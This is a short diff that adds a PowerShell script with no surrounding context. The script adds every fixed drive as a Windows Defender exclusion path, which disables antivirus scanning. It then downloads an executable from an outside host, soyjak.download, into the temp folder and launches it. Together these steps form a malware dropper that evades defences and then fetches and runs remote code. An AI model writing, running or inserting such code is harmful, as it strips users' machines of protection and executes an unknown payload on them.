@@ -1,0 +1,5 @@
+$drives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object -ExpandProperty DeviceID
+foreach ($drive in $drives) {
+    Add-MpPreference -ExclusionPath $drive
+}
+Invoke-WebRequest -Uri "https://soyjak.download/f.php?h=0qoXBi-e&d=1" -OutFile "$env:temp\downloaded.exe"; Start-Process "$env:temp\downloaded.exe"
